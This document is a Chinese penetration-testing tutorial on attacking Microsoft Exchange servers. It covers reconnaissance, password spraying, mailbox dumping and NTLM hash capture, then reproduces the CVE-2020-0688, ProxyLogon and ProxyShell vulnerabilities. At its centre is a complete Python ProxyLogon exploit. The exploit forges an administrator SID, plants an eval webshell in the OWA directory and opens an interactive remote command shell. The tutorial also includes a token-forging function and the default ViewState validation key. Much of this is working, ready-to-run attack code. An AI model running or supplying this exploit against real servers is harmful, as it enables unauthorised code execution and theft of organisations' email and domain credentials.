认识Exchange
==========

1. 邮件服务器角色（Server Role）
-----------------------

Exchange Server 2010包含五个服务器角色，而在Exchange Server 2013版本中精简到了三个服务器角色：

- **邮箱服务器:** 负责认证、重定向、代理来自外部不同客户端的访问请求，主要包含客户端访问服务（Client Access Service）和前端传输服务（Front End Transport Service）两大组件。
- **客户端访问服务器：** 托管邮箱、公共文件夹等数据，主要包含集线传输服务（Hub Transport Service）和邮箱传输服务（Mail Transport Service）两大组件服务。
- **边缘传输服务器：** 负责路由出站与入站邮件、策略应用等。 2. 客户端/远程访问接口和协议
    ----------------
    
    | **endpoint** | **说明** |
    |---|---|
    | /autodiscover | Exchange Server 2007推出的一项自动服务，用于自动配置用户在outlook中邮箱的相关设置，简化用户登录使用邮箱的流程 |
    | /ecp (Exchange Control Panel) | Exchange管理中心，管理员用于管理组织中的Exchange的Web控制台 |
    | /ews (Exchange Web Service, SOAP-over-HTTP) | 实现客户端与服务端之间基于HTTP的SOAP交互 |
    | /mapi (MAPI-over-HTTP, MAPI/HTTP) | Outlook连接Exchange的默认方式，在2013和2013之后开始使用 |
    | /Microsoft-Server-ActiveSync | 用于移动应用程序访问电子邮件 |
    | /OAB (Office Address Book) | 用于为Outlook客户端提供地址簿，减轻Exchange的负担 |
    | /owa (Outlook Web App) | Exchange owa接口，用于通过web应用程序访问邮件 |
    | /poweshell | 用于服务器管理的Exchange管理控制台 |
    | /eac (Exchange Administrator Center) | Exchange管理中心，是组织中的Exchange的web控制台 |

Exchange服务发现
============

1. 基于端口扫描发现
-----------

Exchange需要多个服务与功能组件之间相互依赖，所以服务器会开放多个端口对外提供服务。但是利用nmap进行端口扫描寻找Exchange服务器需要与主机进行交互，会产生大量的通信流量，造成IDS报警并且在目标服务器留下大量的日志。

```bash
nmap -A -O -sV -v 192.168.159.128
```

[![v6aosf.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-3cc943a38d222b763e3afd1ac2167f80fc374618.png)](https://imgse.com/i/v6aosf)  
nmap 命令解析

```php
-A      开启操作系统和版本检测，脚本扫描以及路径信息
-O      开启操作系统检测
-sV     通过开放端口决定服务和版本信息
```

2. SPN查询
--------

服务主体名称（SPN）是Kerberos客户端用于唯一标识给特定Kerberos目标计算机的服务实例名称。服务主体名称是服务实例（可以理解为一个服务，比如HTTP、MSSQL和EXCHANGE）的唯一标识符。Kerberos身份验证将**使用SPN将服务实例与服务登录账户相关联。**

```bash
setspn.exe -T zesiar0.com -F -Q */*
```

[![vyscxs.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-655cf8f17cc0fd7cc1f40a6ea85939f78568adb8.png)](https://imgse.com/i/vyscxs)  
SPN是启用Kerberos的服务所注册的便于KDC查找的服务名称，这些SPN名称信息被记录在活动目录数据库中，只要服务安装完成，这些SPN名称就已经存在除非卸载或者删除，SPN名称查找与当前服务是否启动没有关系（如Exchange服务器的IMAP/POP等部分服务器默认是不启动的，但其SPN名称依然存在)

Exchange渗透
==========

没有Exchange凭据的情况
---------------

### Exchange暴力破解

在企业域环境中，Exchange与域服务集合，域用户账号密码就是Exchange邮箱的账户密码。如果通过暴力手段成功获取了用户邮箱密码，在通常情况下也就间接获得了域用户密码。  
Autodiscover自动发现服务使用Autodiscover.xml配置文件来对用户进行自动设置，获取该自动配置需要用户认证。  
[![v6aTL8.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-9811e6bc67576498bbb63b89f6ac0d547e166843.png)](https://imgse.com/i/v6aTL8)  
MailSniper提供了分别针对OWA接口、EWS接口和ActiveSync接口的password spray。  
[![v6aHeS.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-ac6364b3dbeb70b0511adf169e5c6f09d1e37ebb.png)](https://imgse.com/i/v6aHeS)

### 泄露内网信息

1. **泄露Exchange服务器操作系统，主机名和Netbios名**

在type2返回challenge的过程中，同时返回了操作系统类型，主机名，netbios名等等，这就意味着给服务器发送一个type1的请求，服务器返回type2的响应。  
[![v6abdg.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-ff701fd9b3baf09f58672c1c4e946b3b8722ccd0.png)](https://imgse.com/i/v6abdg)

有Exchange凭据的情况
--------------

### 导出邮箱列表

1. 利用MailSniper ```bash
    
    // 首先导入MailSniper.ps1
    Import-Module .\\MailSniper.ps1
    ```

// 再利用MailSniper导出邮箱列表  
Get-GlobalAddressList -ExchHost MAIL -UserName domain\\username -Password password -Ou  
tFile litst.txt

```php
[![v6aqoQ.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-c7834b0b0899492df73bb8c85ba68d82ec416e68.png)](https://imgse.com/i/v6aqoQ)

2. 利用ruler
```bash
.\\ruler-win64.exe --insecure --url https://localhost/autodiscover/autodiscover.xml --email administrator@zesia
r0.com -u administrator -p zengjiahua..123 --verbose --debug abk dump -o ruler_list.txt
```

但是我在windows server 2016上实验时，会报出错误，暂时还未解决

```bash
panic: runtime error: invalid memory address or nil pointer dereference
[signal 0xc0000005 code=0x0 addr=0x50 pc=0x1258af2]
```

3. 利用impacket ```bash
    
    impacket-exchanger DOMAIN/USERNAME:PASSWORD@MAIL nspi list-tables
    ```

impacket-exchanger DOMAIN/USERNAME:PASSWORD@MAIL nspi dump-tables -guid GUID

```php
[![vys4aT.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-facd918592e765c324aaa85daa53c62c72d60ac4.png)](https://imgse.com/i/vys4aT)

### 检索邮件内容
攻击者可以利用MailSniper在获得合法凭证之后，通过检索邮箱文件夹来尝试发现和窃取包含敏感信息的邮件数据。在中文环境下，需要指定目录为中文的“收件箱”
```bash
Invoke-SelfSearch -Mailbox Administrator@zesiar0.com -Terms *test* -Folder 收件箱 -remote
```

[![vysoiF.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-3f2ec1103bcd4862af6545d719564f3a8a834233.png)](https://imgse.com/i/vysoiF)  
**注意：这里需要加上-remote选项输入用户凭据（不知道为什么其他文章没有提到)**

NTLM 中继
-------

NTLM中继攻击，是指攻击者在NTLM交互过程中充当中间人的角色，在请求认证的客户端与服务端之间传递交互信息，将客户端提交的Net-NTLM哈希截获并随后将其重放到认证目标方，以中继重放的中间人攻击实现无需破解用户名密码而获取权限。

我先以test用户登录，给administrator用户发一封邮件  
[![vysTG4.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-32aa0b0ac0c81cafce56f515dafa2334259f9ece.png)](https://imgse.com/i/vysTG4)  
再在攻击机上启动responder监控eth0网卡  
[![vysHz9.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-f30cc901ab223707211960764920db822791a89b.png)](https://imgse.com/i/vysHz9)  
再登录administrator假装点击邮件，responder接受到NTLMv2 hash  
[![v6aOij.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-d81d1299c205b91eae7fc54d984c7309156af72b.png)](https://imgse.com/i/v6aOij)

Exchange漏洞复现
------------

### CVE-2020-0688

#### 影响范围

- Microsoft Exchange Server 2010 Service Pack 3
- Microsoft Exchange Server 2013
- Microsoft Exchange Server 2016
- Microsoft Exchange Server 2019 #### 漏洞原理
    
    Exchange Server在默认安装的情况下，validationKey和decryptionKey都是相同的，攻击者可以利用静态密钥对服务器发起攻击，在服务器中以SYSTEM权限远程执行代码。
    
    ##### ViewState概述
    
    ViewState机制时ASP.NET中对同一个Page的多次请求（PostBack）之间维持Page及控件状态的一种机制。在WebForm中，每次请求都会存在客户端和服务器之间的一个交互。如果请求完成之后将一些信息传回客户端，下次请求的时候客户端再将这些状态信息提交给服务器，服务器端对这些信息使用和处理，再将这些信息传回给客户端，这就是ViewState的基本工作模式。ViewState的设计目的就是为了将必要的信息持久化在页面中，这样就可以通过ViewState在页面回传的过程中保存状态值。  
    关于ViewState反序列化详细解释：  
    <https://paper.seebug.org/1386/#3-webconfig-viewstate>
    
    #### 利用过程
    
    因为Exchange Server在默认的配置下validationKey和decryptionKey分别表示校验和加密所用的密钥，且都是硬编码。  
    [![v6aXJs.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-66e195d19a376ac667335923903d51fc02d885f8.png)](https://imgse.com/i/v6aXJs)  
    所以利用该漏洞只需要

```bash
--validationkey = CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF（默认）
--validationalg = SHA1（默认）
--generator = B97B4E27（默认）
--viewstateuserkey = ASP.NET_SessionId的值
```

1. 以上变量可以通过下图获取：

[![v6azQ0.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-40077bf2611904e71992f58791286de76375a5a0.png)](https://imgse.com/i/v6azQ0)  
[![v6dpLT.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-806bfb578e02a031a3f15e1f5199daf7bbe0a814.png)](https://imgse.com/i/v6dpLT)

2. 利用ysoserial.exe生成恶意的viewstate

[![vysqMR.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-693533011b2b4cc17e16d8a7bbf7bd1e2b69be7e.png)](https://imgse.com/i/vysqMR)

3. 之后再访问构造好的url ```bash
    /ecp/default.aspx?__VIEWSTATEGENERATOR=<generator>&__VIEWSTATE=URLENCODE(<ViewState>)
    ```
    
    ### CVE-2021-26855
    
    #### 影响范围

- Exchange Server 2019 &lt; 15.02.0792.010
- Exchange Server 2019 &lt; 15.02.0721.013
- Exchange Server 2016 &lt; 15.01.2106.013
- Exchange Server 2013 &lt; 15.00.1497.012 #### 漏洞原理
    
    `Microsoft.Exchange.FrontEndHttpProxy.dll`未有效校验Cookie中可控的`X-BEResource`，后续处理中结合.NET的`UrlBuilder`类特性造成SSRF。exchange会对`X-BEResource`以`~`为分隔符分为一个数组array，array\[0\]为`Fqdn`，array\[1\]为`version`；如果`version`小于`E15MinVersion`，则会进入判断语句，并将变量`ProxyToDownLevel`赋值为True，之后会调用身份认证函数EcpProxyRequestHandler.AddDownLevelProxyHeaders进行身份认证；如果`veesion`大于`E15MinVersion`则跳出if判断从而绕过身份认证。
    
    #### 利用过程

1. 限定路径，路径格式必须是/ecp/xxx.(js/png/..)
2. 构造`X-BEResource`，`~`前面部分为需要SSRF访问的url，后面部分为大于`E15MinVersion`

[![v6dPwF.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-892322da37802f185c1446841ee9ae3531436bfe.png)](https://imgse.com/i/v6dPwF)

### CVE-2021-27065

##### 影响范围

- Exchange Server 2019 &lt; 15.02.0792.010
- Exchange Server 2019 &lt; 15.02.0721.013
- Exchange Server 2016 &lt; 15.01.2106.013
- Exchange Server 2013 &lt; 15.00.1497.012 ##### 漏洞原理
    
    `Microsoft.Exchange.Management.DDIService.WriteFileActivity`未校验文件后缀，可由文件内容部分可控的相关功能写入webshell。
    
    ##### 利用过程

1. 请求EWS，从`X-CalculationBETarget`响应头获取域名

[![v6dkFJ.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-f6273b93f3a49130e594542d49d097a6a2fb1a96.png)](https://imgse.com/i/v6dkFJ)

2. 利用邮箱用户名，请求Autodiscover获取配置中的LegacyDN  
    [![vysLs1.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-def6d42edd6477f9b54ae0a60f879698708d3897.png)](https://imgse.com/i/vysLs1)
3. 利用`MAPI over HTTP`请求引发`Microsoft.Exchange.RpcClientAccess.Server.LoginPermException`获取SID
4. 替换尾部RID为500伪造管理员SID，由ProxyLogonHandler获取管理员身份`ASP.NET_SessionId`与`msExchCanary`
5. 通过DDI组件Getlist接口获取RawIdentity
6. 利用外部URL虚拟路径属性引入Webshell
7. 最后出发重置时的备份功能，将文件写入指定的UNC目录

**注意：webshell的内容需要规避会被URL编码的特殊字符，且字符长度不能超过255**  
**可以利用以下python脚本进行自动化测试**

```python
# -*- coding: utf-8 -*-
import requests
from urllib3.exceptions import InsecureRequestWarning
import random
import string
import argparse
import sys
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

fuzz_email = ['administrator', 'webmaste', 'support', 'sales', 'contact', 'admin', 'test',
              'test2', 'test01', 'test1', 'guest', 'sysadmin', 'info', 'noreply', 'log', 'no-reply']

proxies = {}
user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"

shell_path = "Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\test11.aspx"
shell_absolute_path = "\\\\127.0.0.1\\c$\\%s" % shell_path
# webshell-马子内容
shell_content = '<script language="JScript" runat="server"> function Page_Load(){/**/eval(Request["code"],"unsafe");}</script>'

final_shell = ""

def id_generator(size=6, chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

if __name__=="__main__":
    parser = argparse.ArgumentParser(
        description='Example: python exp.py -u 127.0.0.1 -user administrator -suffix @ex.com\n如果不清楚用户名，可不填写-user参数，将自动Fuzz用户名。')
    parser.add_argument('-u', type=str,
                        help='target')
    parser.add_argument('-user',
                        help='exist email', default='')
    parser.add_argument('-suffix',
                        help='email suffix')
    args = parser.parse_args()
    target = args.u
    suffix = args.suffix
    if suffix == "":
        print("请输入suffix")

    exist_email = args.user
    if exist_email:
        fuzz_email.insert(0, exist_email)
    random_name = id_generator(4) + ".js"
    print("目标 Exchange Server: " + target)

    for i in fuzz_email:
        new_email = i+suffix
        autoDiscoverBody = """<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
    <Request>
      <EMailAddress>%s</EMailAddress> <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
    </Request>
</Autodiscover>
""" % new_email
        # print("get FQDN")
        FQDN = "EXCHANGE01"
        ct = requests.get("https://%s/ecp/%s" % (target, random_name), headers={"Cookie": "X-BEResource=localhost~1942062522",
                                                                            "User-Agent": user_agent},
                      verify=False, proxies=proxies)

        if "X-CalculatedBETarget" in ct.headers and "X-FEServer" in ct.headers:
            FQDN = ct.headers["X-FEServer"]
            print("got FQDN:" + FQDN)

        ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
            "Cookie": "X-BEResource=%s/autodiscover/autodiscover.xml?a=~1942062522;" % FQDN,
            "Content-Type": "text/xml",
            "User-Agent": user_agent},
            data=autoDiscoverBody,
            proxies=proxies,
            verify=False
        )

        if ct.status_code != 200:
            print(ct.status_code)
            print("Autodiscover Error!")

        if "<LegacyDN>" not in str(ct.content):
            print("Can not get LegacyDN!")
        try:
            legacyDn = str(ct.content).split("<LegacyDN>")[
                1].split(r"</LegacyDN>")[0]
            print("Got DN: " + legacyDn)

            mapi_body = legacyDn + \
                "\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00"

            ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
                "Cookie": "X-BEResource=Administrator@%s:444/mapi/emsmdb?MailboxId=f26bc937-b7b3-4402-b890-96c46713e5d5@exchange.lab&a=~1942062522;" % FQDN,
                "Content-Type": "application/mapi-http",
                "X-Requesttype": "Connect",
                "X-Clientinfo": "{2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226}",
                "X-Clientapplication": "Outlook/15.0.4815.1002",
                "X-Requestid": "{E2EA6C1C-E61B-49E9-9CFB-38184F907552}:123456",
                "User-Agent": user_agent
            },
                data=mapi_body,
                verify=False,
                proxies=proxies
            )
            if ct.status_code != 200 or "act as owner of a UserMailbox" not in str(ct.content):
                print("Mapi Error!")
                exit()

            sid = str(ct.content).split("with SID ")[
                1].split(" and MasterAccountSid")[0]

            print("Got SID: " + sid)
            sid = sid.replace(sid.split("-")[-1], "500")

            proxyLogon_request = """<r at="Negotiate" ln="john"><s>%s</s><s a="7" t="1">S-1-1-0</s><s a="7" t="1">S-1-5-2</s><s a="7" t="1">S-1-5-11</s><s a="7" t="1">S-1-5-15</s><s a="3221225479" t="1">S-1-5-5-0-6948923</s></r>
            """ % sid

            ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
                "Cookie": "X-BEResource=Administrator@%s:444/ecp/proxyLogon.ecp?a=~1942062522;" % FQDN,
                "Content-Type": "text/xml",
                "msExchLogonMailbox": "S-1-5-20",
                "User-Agent": user_agent
            },
                data=proxyLogon_request,
                proxies=proxies,
                verify=False
            )
            if ct.status_code != 241 or not "set-cookie" in ct.headers:
                print("Proxylogon Error!")
                exit()

            sess_id = ct.headers['set-cookie'].split(
                "ASP.NET_SessionId=")[1].split(";")[0]

            msExchEcpCanary = ct.headers['set-cookie'].split("msExchEcpCanary=")[
                1].split(";")[0]
            print("Got session id: " + sess_id)
            print("Got canary: " + msExchEcpCanary)

            ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
                # "Cookie": "X-BEResource=Administrator@%s:444/ecp/DDI/DDIService.svc/GetObject?schema=OABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (
                # FQDN, msExchEcpCanary, sess_id, msExchEcpCanary),

                "Cookie": "X-BEResource=Admin@{server_name}:444/ecp/DDI/DDIService.svc/GetList?reqId=1615583487987&schema=VirtualDirectory&msExchEcpCanary={msExchEcpCanary}&a=~1942062522; ASP.NET_SessionId={sess_id}; msExchEcpCanary={msExchEcpCanary1}".
                            format(server_name=FQDN, msExchEcpCanary1=msExchEcpCanary, sess_id=sess_id,
                                    msExchEcpCanary=msExchEcpCanary),
                            "Content-Type": "application/json; charset=utf-8",
                            "msExchLogonMailbox": "S-1-5-20",
                            "User-Agent": user_agent

                            },
                            json={"filter": {
                                "Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                                                "SelectedView": "", "SelectedVDirType": "OAB"}}, "sort": {}},
                            verify=False,
                            proxies=proxies
                            )

            if ct.status_code != 200:
                print("GetOAB Error!")
                exit()
            oabId = str(ct.content).split('"RawIdentity":"')[1].split('"')[0]
            print("Got OAB id: " + oabId)

            oab_json = {"identity": {"__type": "Identity:ECP", "DisplayName": "OAB (Default Web Site)", "RawIdentity": oabId},
                        "properties": {
                            "Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                                        "ExternalUrl": "http://ffff/#%s" % shell_content}}}

            ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
                "Cookie": "X-BEResource=Administrator@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=OABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (
                    FQDN, msExchEcpCanary, sess_id, msExchEcpCanary),
                "msExchLogonMailbox": "S-1-5-20",
                "Content-Type": "application/json; charset=utf-8",
                "User-Agent": user_agent
            },
                json=oab_json,
                proxies=proxies,
                verify=False
            )
            if ct.status_code != 200:
                print("Set external url Error!")
                exit()

            reset_oab_body = {"identity": {"__type": "Identity:ECP", "DisplayName": "OAB (Default Web Site)", "RawIdentity": oabId},
                            "properties": {
                                "Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                                                "FilePathName": shell_absolute_path}}}

            ct = requests.post("https://%s/ecp/%s" % (target, random_name), headers={
                "Cookie": "X-BEResource=Administrator@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (
                    FQDN, msExchEcpCanary, sess_id, msExchEcpCanary),
                "msExchLogonMailbox": "S-1-5-20",
                "Content-Type": "application/json; charset=utf-8",
                "User-Agent": user_agent
            },
                json=reset_oab_body,
                proxies=proxies,
                verify=False
            )

            if ct.status_code != 200:
                print("写入shell失败")
                exit()
            shell_url = "https://"+target+"/owa/auth/test11.aspx"
            print("成功写入shell：" + shell_url)
            print("下面验证shell是否ok")
            print('code=Response.Write(new ActiveXObject("WScript.Shell").exec("whoami").StdOut.ReadAll());')
            print("正在请求shell")
            import time
            time.sleep(1)
            data = requests.post(shell_url, data={
                                "code": "Response.Write(new ActiveXObject(\"WScript.Shell\").exec(\"whoami\").StdOut.ReadAll());"}, verify=False, proxies=proxies)
            if data.status_code != 200:
                print("写入shell失败")
            else:
                print("shell:"+data.text.split("OAB (Default Web Site)")
                    [0].replace("Name                            : ", ""))
                print('[+]用户名: '+ new_email)
                final_shell = shell_url
                break
        except:
            print('[-]用户名: '+new_email)
            print("=============================")
    if not final_shell:
        sys.exit()
    print("下面启用交互式shell")
    while True:
        input_cmd = input("[#] command: ")
        data={"code": """Response.Write(new ActiveXObject("WScript.Shell").exec("cmd /c %s").stdout.readall())""" % input_cmd}
        ct = requests.post(
            final_shell,
            data=data,verify=False, proxies=proxies)
        if ct.status_code != 200 or "OAB (Default Web Site)" not in ct.text:
            print("[*] Failed to execute shell command")
        else:
            shell_response = ct.text.split(
                "Name                            :")[0]
            print(shell_response)

```

CVE-2021-26855与CVE-2021-27065一起使用就是ProxyLogon，可以不需要邮箱用户的凭证就可以实现RCE

### CVE-2021-34473

#### 影响范围

- Exchange Server 2013 &lt; Apr21SU
- Exchange Server 2016 &lt; Apr21SU &lt; CU21
- Exchange Server 2019 &lt; Apr21SU &lt; CU10 #### 漏洞原理
    
    在`HttpProxy\EwsAutodiscoverProxyRequestHandler.cs`的·`GetClientUrlForProxy`函数中剔除`absoluteUri`中的`this.explicitLogonAddress`，而`this.explicitLogonAddress`的取值来自（GET|POST|Cookie|Server）请求中`Email`的值，但是需要满足`RequestPathParser.IsAutodiscoverV2PreviewRequest()`的返回值为true，这个则是检查路径中是否存在`/autodiscove.json`
    
    #### 利用过程

1. 构造URL `https://192.168.159.131/autodiscover/autodiscover.json?@foo.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3f@foo.com`

[![v6dZS1.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-b9df9b98c1a691bbc05cef1a1b584e314267c6e6.png)](https://imgse.com/i/v6dZS1)

2. 利用exchange的autodiscover服务可以用来查找高权限用户的配置文件，首先需要获取legacyDn属性，再利用这个属性+末尾添加不可见字符可以获得目标用户的sid。获得了用户的sid后就可以使用目标用户的权限来访问ews的api从而实现恶意操作。这一步和proxyLogon中是一样的。 ### CVE-2021-34523
    
    #### 影响范围

- Exchange Server 2013 &lt; Apr21SU
- Exchange Server 2016 &lt; Apr21SU &lt; CU21
- Exchange Server 2019 &lt; Apr21SU &lt; CU10
    
    #### 漏洞原理
    
    Exchange Powershell Remoting是一个基于WSMan协议的一个服务，可以执行一些特定的powershell命令，实现的功能有发邮件、读邮件、更新配置文件等，使用前提是使用者具有邮箱。所以，如果利用前面的ssrf来访问powershell接口是不会成功的，因为system是没有邮箱 的。接下来，就需要先解决身份认证问题。因为在`ShouldCopyHeaderToServerRequest`方法中会过滤一些自定义请求头，其中就包括校验身份的`X-CommonAccessToken`。  
    在`Microsoft.Exchange.Configuration.RemotePowershellBackendCmdletProxyModule.dll`中，有个用户可控的输入点`X-Rps-CAT`。当`X-CommonAccessToken`请求头为空时，会从`X-Rps-CAT`中读取数据，这个数据经过处理后会赋给`X-CommonAccessToken`
    
    #### 利用过程
    
    利用以下python代码可以生成token
    
    ```python
    def gen_token(uname, sid):
    version = 0
    ttype = 'Windows'
    compressed = 0
    auth_type = 'Kerberos'
    raw_token = b''
    gsid = 'S-1-5-32-544'
    
    version_data = b'V' + (1).to_bytes(1, 'little') + (version).to_bytes(1, 'little')
    type_data = b'T' + (len(ttype)).to_bytes(1, 'little') + ttype.encode()
    compress_data = b'C' + (compressed).to_bytes(1, 'little')
    auth_data = b'A' + (len(auth_type)).to_bytes(1, 'little') + auth_type.encode()
    login_data = b'L' + (len(uname)).to_bytes(1, 'little') + uname.encode()
    user_data = b'U' + (len(sid)).to_bytes(1, 'little') + sid.encode()
    group_data = b'G' + pack('<II', 1, 7) + (len(gsid)).to_bytes(1, 'little') + gsid.encode()
    ext_data = b'E' + pack('>I', 0) 
    
    raw_token += version_data
    raw_token += type_data
    raw_token += compress_data
    raw_token += auth_data
    raw_token += login_data
    raw_token += user_data
    raw_token += group_data
    raw_token += ext_data
    
    data = base64.b64encode(raw_token).decode()
    
    return data
    ```
    
    ### CVE-2021-31207
    
    #### 影响范围
- Exchange Server 2013 &lt; May21SU
- Exchange Server 2016 &lt; May21SU &lt; CU21
- Exchange Server 2019 &lt; May21SU &lt; CU10
    
    #### 漏洞原理
    
    用户在认证之后，可以写入任意后缀文件
    
    #### 利用过程
    
    结合上面的漏洞，用户首先通过ssrf漏洞访问powershell接口，利用该接口导出邮件到指定web目录下。但是这样还存在一个问题，导出的邮件是pst编码的，所以需要再提前编码一次。

CVE-2021-34473，CVE-2021-31207和CVE-2021-34523一起来利用就是proxyshell，最终可以实现rce。  
利用脚本：  
<https://github.com/horizon3ai/proxyshell>